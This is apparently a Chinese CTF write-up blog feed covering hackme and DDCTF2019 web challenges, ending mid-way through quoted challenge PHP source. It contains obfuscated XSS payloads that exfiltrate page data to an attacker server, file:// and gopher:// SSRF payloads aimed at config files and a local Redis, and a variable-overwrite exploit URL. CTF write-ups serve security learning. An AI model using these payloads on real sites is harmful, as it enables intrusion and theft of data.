class="line">&lt;svg&#x2F;onload&#x3D;&quot;&amp;#100;&amp;#111;&amp;#99;&amp;#117;&amp;#109;&amp;#101;&amp;#110;&amp;#116;&amp;#46;&amp;#108;&amp;#111;&amp;#99;&amp;#97;&amp;#116;&amp;#105;&amp;#111;&amp;#110;&amp;#61;&#39;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#58;&amp;#47;&amp;#47;&amp;#111;&amp;#118;&amp;#48;&amp;#101;&amp;#103;&amp;#53;&amp;#46;&amp;#99;&amp;#101;&amp;#121;&amp;#101;&amp;#46;&amp;#105;&amp;#111;&amp;#47;&amp;#63;&#39;&amp;#43;&amp;#98;&amp;#116;&amp;#111;&amp;#97;&amp;#40;&amp;#100;&amp;#111;&amp;#99;&amp;#117;&amp;#109;&amp;#101;&amp;#110;&amp;#116;&amp;#46;&amp;#98;&amp;#111;&amp;#100;&amp;#121;&amp;#46;&amp;#105;&amp;#110;&amp;#110;&amp;#101;&amp;#114;&amp;#72;&amp;#84;&amp;#77;&amp;#76;&amp;#41;&quot;&gt;</span><br></pre></td></tr></table></div></figure><p>果然可以收到payload，base64解码一下再保存为html格式打开</p><p><img src="/2020/09/13/hackme-1/8.png" alt></p><p>send request功能有个request.php，尝试读取该页面</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg&#x2F;onload&#x3D;&quot;</span><br><span class="line">xmlhttp&#x3D;new XMLHttpRequest();</span><br><span class="line">xmlhttp.onreadystatechange&#x3D;function()</span><br><span class="line">&#123;</span><br><span class="line">    if (xmlhttp.readyState&#x3D;&#x3D;4 &amp;&amp; xmlhttp.status&#x3D;&#x3D;200)</span><br><span class="line">    &#123;</span><br><span class="line">        document.location&#x3D;&#39;http:&#x2F;&#x2F;vps_ip:23333&#x2F;?&#39;+btoa(xmlhttp.responseText);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">xmlhttp.open(&quot;GET&quot;,&quot;request.php&quot;,true);</span><br><span class="line">xmlhttp.send();</span><br><span class="line">&quot;&gt;</span><br></pre></td></tr></table></div></figure><p>编码一下</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg&#x2F;onload&#x3D;&quot;&amp;#120;&amp;#109;&amp;#108;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#61;&amp;#110;&amp;#101;&amp;#119;&amp;#32;&amp;#88;&amp;#77;&amp;#76;&amp;#72;&amp;#116;&amp;#116;&amp;#112;&amp;#82;&amp;#101;&amp;#113;&amp;#117;&amp;#101;&amp;#115;&amp;#116;&amp;#40;&amp;#41;&amp;#59;&amp;#10;&amp;#120;&amp;#109;&amp;#108;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#46;&amp;#111;&amp;#110;&amp;#114;&amp;#101;&amp;#97;&amp;#100;&amp;#121;&amp;#115;&amp;#116;&amp;#97;&amp;#116;&amp;#101;&amp;#99;&amp;#104;&amp;#97;&amp;#110;&amp;#103;&amp;#101;&amp;#61;&amp;#102;&amp;#117;&amp;#110;&amp;#99;&amp;#116;&amp;#105;&amp;#111;&amp;#110;&amp;#40;&amp;#41;&amp;#10;&amp;#123;&amp;#10;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#105;&amp;#102;&amp;#32;&amp;#40;&amp;#120;&amp;#109;&amp;#108;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#46;&amp;#114;&amp;#101;&amp;#97;&amp;#100;&amp;#121;&amp;#83;&amp;#116;&amp;#97;&amp;#116;&amp;#101;&amp;#61;&amp;#61;&amp;#52;&amp;#32;&amp;#38;&amp;#38;&amp;#32;&amp;#120;&amp;#109;&amp;#108;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#46;&amp;#115;&amp;#116;&amp;#97;&amp;#116;&amp;#117;&amp;#115;&amp;#61;&amp;#61;&amp;#50;&amp;#48;&amp;#48;&amp;#41;&amp;#10;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#123;&amp;#10;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#100;&amp;#111;&amp;#99;&amp;#117;&amp;#109;&amp;#101;&amp;#110;&amp;#116;&amp;#46;&amp;#108;&amp;#111;&amp;#99;&amp;#97;&amp;#116;&amp;#105;&amp;#111;&amp;#110;&amp;#61;&#39;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#58;&amp;#47;&amp;#47;&amp;#49;&amp;#51;&amp;#56;&amp;#46;&amp;#54;&amp;#56;&amp;#46;&amp;#50;&amp;#57;&amp;#46;&amp;#57;&amp;#50;&amp;#58;&amp;#50;&amp;#51;&amp;#51;&amp;#51;&amp;#51;&amp;#47;&amp;#63;&#39;&amp;#43;&amp;#98;&amp;#116;&amp;#111;&amp;#97;&amp;#40;&amp;#120;&amp;#109;&amp;#108;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#46;&amp;#114;&amp;#101;&amp;#115;&amp;#112;&amp;#111;&amp;#110;&amp;#115;&amp;#101;&amp;#84;&amp;#101;&amp;#120;&amp;#116;&amp;#41;&amp;#59;&amp;#10;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#125;&amp;#10;&amp;#125;&amp;#10;&amp;#120;&amp;#109;&amp;#108;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#46;&amp;#111;&amp;#112;&amp;#101;&amp;#110;&amp;#40;&amp;#34;&amp;#71;&amp;#69;&amp;#84;&amp;#34;&amp;#44;&amp;#34;&amp;#114;&amp;#101;&amp;#113;&amp;#117;&amp;#101;&amp;#115;&amp;#116;&amp;#46;&amp;#112;&amp;#104;&amp;#112;&amp;#34;&amp;#44;&amp;#116;&amp;#114;&amp;#117;&amp;#101;&amp;#41;&amp;#59;&amp;#10;&amp;#120;&amp;#109;&amp;#108;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#46;&amp;#115;&amp;#101;&amp;#110;&amp;#100;&amp;#40;&amp;#41;&amp;#59;&quot;&gt;</span><br></pre></td></tr></table></div></figure><p>然后在vps上即可收到base64字符串，解码</p><p><img src="/2020/09/13/hackme-1/9.png" alt></p><p>这应该就是题目的利用位置，我们尝试读config.php文件</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg&#x2F;onload&#x3D;&quot;</span><br><span class="line">xmlhttp&#x3D;new XMLHttpRequest();</span><br><span class="line">xmlhttp.onreadystatechange&#x3D;function()</span><br><span class="line">&#123;</span><br><span class="line">    if (xmlhttp.readyState&#x3D;&#x3D;4 &amp;&amp; xmlhttp.status&#x3D;&#x3D;200)</span><br><span class="line">    &#123;</span><br><span class="line">        document.location&#x3D;&#39;http:&#x2F;&#x2F;vps_ip:23333&#x2F;?&#39;+btoa(xmlhttp.responseText);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">xmlhttp.open(&quot;POST&quot;,&quot;request.php&quot;,true);</span><br><span class="line">xmlhttp.setRequestHeader(&quot;Content-type&quot;,&quot;application&#x2F;x-www-form-urlencoded&quot;);</span><br><span class="line">xmlhttp.send(&quot;url&#x3D;file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;config.php&quot;);</span><br><span class="line">&quot;&gt;</span><br></pre></td></tr></table></div></figure><p>编码发送，果然可以收到flag</p><p><img src="/2020/09/13/hackme-1/10.png" alt="result"></p>        <h1 id="xssrf-redis">          <a href="#xssrf-redis" class="heading-link"><i class="fas fa-link"></i></a>xssrf redis</h1>      <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg&#x2F;onload&#x3D;&quot;</span><br><span class="line">xmlhttp&#x3D;new XMLHttpRequest();</span><br><span class="line">xmlhttp.onreadystatechange&#x3D;function()</span><br><span class="line">&#123;</span><br><span class="line">    if (xmlhttp.readyState&#x3D;&#x3D;4 &amp;&amp; xmlhttp.status&#x3D;&#x3D;200)</span><br><span class="line">    &#123;</span><br><span class="line">        document.location&#x3D;&#39;http:&#x2F;&#x2F;vps_ip:23333&#x2F;?&#39;+btoa(xmlhttp.responseText);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">xmlhttp.open(&quot;POST&quot;,&quot;request.php&quot;,true);</span><br><span class="line">xmlhttp.setRequestHeader(&quot;Content-type&quot;,&quot;application&#x2F;x-www-form-urlencoded&quot;);</span><br><span class="line">xmlhttp.send(&quot;url&#x3D;gopher:&#x2F;&#x2F;127.0.0.1:25566&#x2F;_KEYS%2520*%250a_quit&quot;);</span><br><span class="line">&quot;&gt;</span><br></pre></td></tr></table></div></figure><p>发现有flag，读取之</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xmlhttp.send(&quot;url&#x3D;gopher:&#x2F;&#x2F;127.0.0.1:25566&#x2F;_lrange%2520flag%25200%252053%250a_quit&quot;);</span><br></pre></td></tr></table></div></figure><p>然后处理一下即可得到flag</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;历史文章补发&lt;/p&gt;

        &lt;h1 id=&quot;前言&quot;&gt;
          &lt;a href=&quot;#前言&quot; class=&quot;heading-link&quot;&gt;&lt;i class=&quot;fas fa-link&quot;&gt;&lt;/i&gt;&lt;/a&gt;前言&lt;/h1&gt;
      &lt;p&gt;最近rootme网站好像有点问题，所以刷点hackme网站的题目，网址&lt;span class=&quot;exturl&quot;&gt;&lt;a class=&quot;exturl__link&quot; href=&quot;https://hackme.inndy.tw/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://hackme.inndy.tw/&lt;/a&gt;&lt;span class=&quot;exturl__icon&quot;&gt;&lt;i class=&quot;fas fa-external-link-alt&quot;&gt;&lt;/i&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="writeup" scheme="http://chaosec.top/categories/writeup/"/>
    
    
      <category term="CTF" scheme="http://chaosec.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>DDCTF2019</title>
    <link href="http://chaosec.top/2020/09/13/DDCTF2019/"/>
    <id>http://chaosec.top/2020/09/13/DDCTF2019/</id>
    <published>2020-09-13T13:02:17.000Z</published>
    <updated>2020-09-13T13:02:17.121Z</updated>
    
    <content type="html"><![CDATA[<p>历史文章补发</p><a id="more"></a>        <h1 id="滴">          <a href="#滴" class="heading-link"><i class="fas fa-link"></i></a>滴~</h1>      <p>签到题</p><p>访问首页看到jpg参数请求有点想base64，测试发现是将文件名进行16进制编码后再进行两次base64编码，按照该方法构造index.php发现可以实现成功读取到index.php源码 </p><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * https://blog.csdn.net/FengBanLiuYun/article/details/80616607</span></span><br><span class="line"><span class="comment"> * Date: July 4,2018</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">error_reporting(E_ALL || ~E_NOTICE);</span><br><span class="line">header(<span class="string">'content-type:text/html;charset=utf-8'</span>);</span><br><span class="line"><span class="keyword">if</span>(! <span class="keyword">isset</span>($_GET[<span class="string">'jpg'</span>]))</span><br><span class="line">    header(<span class="string">'Refresh:0;url=./index.php?jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09'</span>);</span><br><span class="line">$file = hex2bin(base64_decode(base64_decode($_GET[<span class="string">'jpg'</span>])));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;title&gt;'</span>.$_GET[<span class="string">'jpg'</span>].<span class="string">'&lt;/title&gt;'</span>;</span><br><span class="line">$file = preg_replace(<span class="string">"/[^a-zA-Z0-9.]+/"</span>,<span class="string">""</span>, $file);</span><br><span class="line"><span class="keyword">echo</span> $file.<span class="string">'&lt;/br&gt;'</span>;</span><br><span class="line">$file = str_replace(<span class="string">"config"</span>,<span class="string">"!"</span>, $file);</span><br><span class="line"><span class="keyword">echo</span> $file.<span class="string">'&lt;/br&gt;'</span>;</span><br><span class="line">$txt = base64_encode(file_get_contents($file));</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;img src='data:image/gif;base64,"</span>.$txt.<span class="string">"'&gt;&lt;/img&gt;"</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Can you find the flag file?</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></div></figure><p>发现了注释中有文章链接，访问之后看到历史文章有和注释中日期相同的文章，发现是swp文件泄露的相关文章，测试发现存在<code>practice.txt.swp</code>页面</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">f1ag!ddctf.php</span><br></pre></td></tr></table></div></figure><p>我们可以按照上面的方法读取该文件，因为该页面过滤特殊字符，但是同时又把<code>config</code>替换为<code>!</code>，所以我们可以构造文件名<code>f1agconfigddctf.php</code>成功读取到源码</p><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">'config.php'</span>);</span><br><span class="line">$k = <span class="string">'hello'</span>;</span><br><span class="line">extract($_GET);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($uid))</span><br><span class="line">&#123;</span><br><span class="line">    $content=trim(file_get_contents($k));</span><br><span class="line">    <span class="keyword">if</span>($uid==$content)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span><span class="string">'hello'</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></div></figure><p>很明显的变量覆盖漏洞</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;117.51.150.246&#x2F;f1ag!ddctf.php?uid&#x3D;&amp;k&#x3D;</span><br></pre></td></tr></table></div></figure><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DDCTF&#123;436f6e67726174756c6174696f6e73&#125;</span><br></pre></td></tr></table></div></figure>        <h1 id="WEB-签到题">          <a href="#WEB-签到题" class="heading-link"><i class="fas fa-link"></i></a>WEB 签到题</h1>      <p>题目需要我们以admin身份登录，查看网络信息发现一个中间页面Auth.php，在该请求头中看到了didictf_username字段，猜测修改该字段即可以admin身份登录，抓包修改一下</p><p><img src="https://i.loli.net/2019/05/20/5ce296dc16dc917104.png" alt></p><p>即可以admin身份登录</p><p><img src="https://i.loli.net/2019/05/20/5ce297062e1c059824.png" alt></p><p>访问该页面可以看到两个源码</p><p><span class="exturl"><a class="exturl__link" href="http://117.51.158.44/app/fL2XID2i0Cdh.php" target="_blank" rel="noopener">http://117.51.158.44/app/fL2XID2i0Cdh.php</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//url:app/Application.php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">Class</span> <span class="title">Application</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $path = <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">response</span><span class="params">($data, $errMsg = <span class="string">'success'</span>)</span> </span>&#123;</span><br><span class="line">        $ret = [<span class="string">'errMsg'</span> =&gt; $errMsg,</span><br><span class="line">            <span class="string">'data'</span> =&gt; $data];</span><br><span class="line">        $ret = json_encode($ret);</span><br><span class="line">        header(<span class="string">'Content-type: application/json'</span>);</span><br><span class="line">        <span class="keyword">echo</span> $ret;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">auth</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $DIDICTF_ADMIN = <span class="string">'admin'</span>;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>($_SERVER[<span class="string">'HTTP_DIDICTF_USERNAME'</span>]) &amp;&amp; $_SERVER[<span class="string">'HTTP_DIDICTF_USERNAME'</span>] == $DIDICTF_ADMIN) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;response(<span class="string">'您当前当前权限为管理员----请访问:app/fL2XID2i0Cdh.php'</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">TRUE</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;response(<span class="string">'抱歉，您没有登陆权限，请获取权限后访问-----'</span>,<span class="string">'error'</span>);</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">sanitizepath</span><span class="params">($path)</span> </span>&#123;</span><br><span class="line">    $path = trim($path);</span><br><span class="line">    $path=str_replace(<span class="string">'../'</span>,<span class="string">''</span>,$path);</span><br><span class="line">    $path=str_replace(<span class="string">'..\\'</span>,<span class="string">''</span>,$path);</span><br><span class="line">    <span class="keyword">return</span> $path;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;path)) &#123;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $path = <span class="keyword">$this</span>-&gt;sanitizepath(<span class="keyword">$this</span>-&gt;path);</span><br><span class="line">        <span class="keyword">if</span>(strlen($path) !== <span class="number">18</span>) &#123;</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;response($data=file_get_contents($path),<span class="string">'Congratulations'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//url:app/Session.php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">'Application.php'</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Session</span> <span class="keyword">extends</span> <span class="title">Application</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//key建议为8位字符串</span></span><br><span class="line">    <span class="keyword">var</span> $eancrykey                  = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">var</span> $cookie_expiration= <span class="number">7200</span>;</span><br><span class="line">    <span class="keyword">var</span> $cookie_name                = <span class="string">'ddctf_id'</span>;</span><br><span class="line">    <span class="keyword">var</span> $cookie_path= <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">var</span> $cookie_domain= <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">var</span> $cookie_secure= <span class="keyword">FALSE</span>;</span><br><span class="line">    <span class="keyword">var</span> $activity                   = <span class="string">"DiDiCTF"</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">parent</span>::auth()) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;get_key();</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;session_read()) &#123;</span><br><span class="line">                $data = <span class="string">'DiDI Welcome you %s'</span>;</span><br><span class="line">                $data = sprintf($data,$_SERVER[<span class="string">'HTTP_USER_AGENT'</span>]);</span><br><span class="line">                <span class="keyword">parent</span>::response($data,<span class="string">'sucess'</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;session_create();</span><br><span class="line">                $data = <span class="string">'DiDI Welcome you'</span>;</span><br><span class="line">                <span class="keyword">parent</span>::response($data,<span class="string">'sucess'</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">get_key</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">//eancrykey  and flag under the folder</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;eancrykey =  file_get_contents(<span class="string">'../config/key.txt'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">session_read</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">empty</span>($_COOKIE)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $session = $_COOKIE[<span class="keyword">$this</span>-&gt;cookie_name];</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">isset</span>($session)) &#123;</span><br><span class="line">            <span class="keyword">parent</span>::response(<span class="string">"session not found"</span>,<span class="string">'error'</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $hash = substr($session,strlen($session)<span class="number">-32</span>);</span><br><span class="line">        $session = substr($session,<span class="number">0</span>,strlen($session)<span class="number">-32</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>($hash !== md5(<span class="keyword">$this</span>-&gt;eancrykey.$session)) &#123;</span><br><span class="line">            <span class="keyword">parent</span>::response(<span class="string">"the cookie data not match"</span>,<span class="string">'error'</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $session = unserialize($session);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!is_array($session) <span class="keyword">OR</span> !<span class="keyword">isset</span>($session[<span class="string">'session_id'</span>]) <span class="keyword">OR</span> !<span class="keyword">isset</span>($session[<span class="string">'ip_address'</span>]) <span class="keyword">OR</span> !<span class="keyword">isset</span>($session[<span class="string">'user_agent'</span>]))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST[<span class="string">"nickname"</span>])) &#123;</span><br><span class="line">            $arr = <span class="keyword">array</span>($_POST[<span class="string">"nickname"</span>],<span class="keyword">$this</span>-&gt;eancrykey);</span><br><span class="line">            $data = <span class="string">"Welcome my friend %s"</span>;</span><br><span class="line">            <span class="keyword">foreach</span> ($arr <span class="keyword">as</span> $k =&gt; $v) &#123;</span><br><span class="line">                $data = sprintf($data,$v);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">parent</span>::response($data,<span class="string">"Welcome"</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>($session[<span class="string">'ip_address'</span>] != $_SERVER[<span class="string">'REMOTE_ADDR'</span>]) &#123;</span><br><span class="line">            <span class="keyword">parent</span>::response(<span class="string">'the ip addree not match'</span>.<span class="string">'error'</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>($session[<span class="string">'user_agent'</span>] != $_SERVER[<span class="string">'HTTP_USER_AGENT'</span>]) &#123;</span><br><span class="line">            <span class="keyword">parent</span>::response(<span class="string">'the user agent not match'</span>,<span class="string">'error'</span>);</span><br><span 